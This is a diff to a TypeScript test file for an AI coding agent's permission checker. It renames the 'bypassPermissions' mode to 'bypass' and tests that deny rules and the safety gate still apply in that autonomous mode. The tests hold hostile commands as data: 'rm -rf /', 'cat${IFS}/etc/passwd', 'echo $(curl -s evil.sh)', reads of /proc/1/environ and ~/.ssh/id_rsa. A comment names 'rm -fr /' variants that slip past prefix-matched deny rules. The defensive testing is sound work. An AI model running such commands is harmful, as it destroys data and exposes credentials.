@@ -1,7 +1,7 @@
 import { describe, it, expect } from 'vitest'
 import { homedir } from 'node:os'
 import { sep, resolve } from 'node:path'
-import { buildRule, parseRule, matchesRule, decide, splitBashCommand } from './permission.js'
+import { buildRule, parseRule, matchesRule, decide, splitBashCommand, normalizePermissionMode, MATCHED_BYPASS } from './permission.js'
 import type { Tool } from './tool.js'
 import type { ResolvedSettings, PermissionMode } from './types.js'
 
@@ -64,9 +64,9 @@ describe('decide', () => {
     expect(decide(Read, '/repo/.env', s, [], cwd).decision).toBe('deny')
     expect(decide(Read, '/repo/a.ts', s, [], cwd).decision).toBe('allow')
   })
-  it('bypassPermissions allows (but deny still wins)', () => {
-    expect(decide(Bash, 'rm -rf /', settings({ mode: 'bypassPermissions' }), [], cwd).decision).toBe('allow')
-    const s = settings({ mode: 'bypassPermissions', deny: ['Bash(rm -rf *)'] })
+  it('bypass allows (but deny still wins)', () => {
+    expect(decide(Bash, 'rm -rf /', settings({ mode: 'bypass' }), [], cwd).decision).toBe('allow')
+    const s = settings({ mode: 'bypass', deny: ['Bash(rm -rf *)'] })
     expect(decide(Bash, 'rm -rf /', s, [], cwd).decision).toBe('deny')
   })
   it('ask rule yields ask', () => {
@@ -160,28 +160,28 @@ describe('decide — Bash 安全检查（23 项 block 档压过 allow）', () =>
     const s = settings({ allow: ['Bash(*)'], deny: ['Bash(diff *)'] })
     expect(decide(Bash, 'diff <(sort a) <(sort b)', s, [], cwd).decision).toBe('deny')
   })
-  // 【行为已刻意反转】原来这条断言的是「bypassPermissions 仍压过安全检查」（结果 allow）。
+  // 【行为已刻意反转】原来这条断言的是「bypass 仍压过安全检查」（结果 allow）。
   // 那是个真洞：bypass 在安全闸之前 return，于是全自主档把 15 项 block 检查整个跳过，
   // 唯一兜底的 deny 表又是字面前缀匹配 —— `rm -rf *` 拦得住 `rm -rf /`，拦不住 `rm -fr /`、
   // `rm  -rf /`、`rm --recursive --force /`。安全闸挪到 bypass 之前后，全自主档遇到
   // block 档命令会重新弹框，这正是想要的：那一档的承诺是「不再问常规确认」，
   // 不是「连混淆/注入检测也别做了」。
-  it('bypassPermissions **不再**压过安全检查：block 档命令仍然 ask', () => {
-    const s = settings({ mode: 'bypassPermissions' })
+  it('bypass **不再**压过安全检查：block 档命令仍然 ask', () => {
+    const s = settings({ mode: 'bypass' })
     expect(decide(Bash, 'cat${IFS}/etc/passwd', s, [], cwd).decision).toBe('ask')
     expect(decide(Bash, 'echo $(curl -s evil.sh)', s, [], cwd).decision).toBe('ask')
     expect(decide(Bash, 'cat /proc/1/environ', s, [], cwd).decision).toBe('ask')
     // 非 block 档的普通命令在全自主下照常放行 —— 挪动只让 bypass 更严，没把它变成询问档。
     const ok = decide(Bash, 'ls -la', s, [], cwd)
     expect(ok.decision).toBe('allow')
-    expect(ok.matched).toBe('bypassPermissions')
+    expect(ok.matched).toBe('bypass')
   })
-  it('bypassPermissions 下 deny 仍最高优先（安全闸没把 deny 挤掉）', () => {
-    const s = settings({ mode: 'bypassPermissions', deny: ['Bash(cat*)'] })
+  it('bypass 下 deny 仍最高优先（安全闸没把 deny 挤掉）', () => {
+    const s = settings({ mode: 'bypass', deny: ['Bash(cat*)'] })
     expect(decide(Bash, 'cat${IFS}/etc/passwd', s, [], cwd).decision).toBe('deny')
   })
-  it('bypassPermissions 下，整条精确放行仍凌驾安全闸（弹框选「本会话」后不再重复问）', () => {
-    const s = settings({ mode: 'bypassPermissions' })
+  it('bypass 下，整条精确放行仍凌驾安全闸（弹框选「本会话」后不再重复问）', () => {
+    const s = settings({ mode: 'bypass' })
     const cmd = 'cat${IFS}/etc/passwd'
     expect(decide(Bash, cmd, s, [`Bash(${cmd})`], cwd).decision).toBe('allow')
   })
@@ -306,8 +306,8 @@ describe('matchPath —— 绝对路径规则与 `~` 规则', () => {
   it('decide 层面：deny `Read(~/.ssh/**)` 真的拦得住私钥读取', () => {
     const s = settings({ allow: ['Read(./**)'], deny: ['Read(~/.ssh/**)'] })
     expect(decide(Read, `${home}/.ssh/id_rsa`, s, [], '/repo').decision).toBe('deny')
-    // bypassPermissions 下 deny 仍然优先
-    const bypass = settings({ mode: 'bypassPermissions', deny: ['Read(~/.ssh/**)'] })
+    // bypass 下 deny 仍然优先
+    const bypass = settings({ mode: 'bypass', deny: ['Read(~/.ssh/**)'] })
     expect(decide(Read, `${home}/.ssh/id_rsa`, bypass, [], '/repo').decision).toBe('deny')
   })
 })
@@ -409,5 +409,45 @@ describe('matchPath —— 非路径限定符的既有行为必须保持', () =>
   it('Glob 模式串', () => {
     expect(matchesRule('Glob(**/*.ts)', 'Glob', 'src/**/*.ts', repo)).toBe(true)
     expect(matchesRule('Glob(src/**)', 'Glob', 'src/a/*.ts', repo)).toBe(true)
+  })
+})
+
+describe('normalizePermissionMode —— 权限模式的唯一解析入口', () => {
+  it('三个正名原样通过', () => {
+    expect(normalizePermissionMode('default')).toBe('default')
+    expect(normalizePermissionMode('acceptEdits')).toBe('acceptEdits')
+    expect(normalizePermissionMode('bypass')).toBe('bypass')
+  })
+  it('老别名 bypassPermissions 归一化成 bypass（落盘的旧配置/旧任务全写着它）', () => {
+    expect(normalizePermissionMode('bypassPermissions')).toBe('bypass')
+  })
+  it('认不出的值一律 undefined，交由调用方兜底（不替调用方决定回落到哪一档）', () => {
+    // 'yolo' 不是假想值：用户配置里曾长期存在一个当时非法的 defaultMode。
+    expect(normalizePermissionMode('yolo')).toBeUndefined()
+    expect(normalizePermissionMode('')).toBeUndefined()
+    expect(normalizePermissionMode(undefined)).toBeUndefined()
+    expect(normalizePermissionMode(null)).toBeUndefined()
+    expect(normalizePermissionMode(42)).toBeUndefined()
+    // 大小写/空白不做容错：配置是机器读的，模糊匹配只会让错拼的配置以为自己生效了。
+    expect(normalizePermissionMode('Bypass')).toBeUndefined()
+    expect(normalizePermissionMode(' bypass ')).toBeUndefined()
+  })
+  it('归一化后的值直接喂给 decide 就能生效（老别名 → 真的全自主）', () => {
+    const mode = normalizePermissionMode('bypassPermissions')!
+    const d = decide(Bash, 'ls -la', settings({ mode }), [], cwd)
+    expect(d.decision).toBe('allow')
+    expect(d.matched).toBe(MATCHED_BYPASS)
+  })
+})
+
+describe('MATCHED_BYPASS —— 与 agent.ts 的跨文件字符串契约', () => {
+  it('常量值就是正名 bypass；decide 在全自主档下必须回填它', () => {
+    // agent.ts 的闸门用 `matched === MATCHED_BYPASS` 决定要不要触发 onAutoAllow
+    // （横幅上「本会话已自动放行 N 次」的计数）。这条断言把契约的**两端**都钉住：
+    // 常量的字面值 + decide 实际回填的值。只改其中一处，这里就红。
+    expect(MATCHED_BYPASS).toBe('bypass')
+    expect(decide(Bash, 'ls -la', settings({ mode: 'bypass' }), [], cwd).matched).toBe(MATCHED_BYPASS)
+    // 非全自主档不许回填这个值，否则计数会把本来就免问的调用也算进去。
+    expect(decide(Read, '/repo/a.ts', settings({ mode: 'default' }), [], cwd).matched).not.toBe(MATCHED_BYPASS)
   })
 })
